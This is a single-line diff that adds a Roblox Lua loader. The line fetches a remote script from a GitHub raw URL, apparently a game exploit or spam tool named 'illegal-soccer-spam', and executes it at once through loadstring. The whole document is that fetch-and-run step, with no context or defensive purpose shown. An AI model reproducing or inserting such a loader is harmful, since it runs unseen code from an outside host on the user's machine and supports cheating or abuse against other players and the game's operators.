@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/update-illegal-soccer-spam6-efvgfewhhiz2bx.lua"))()
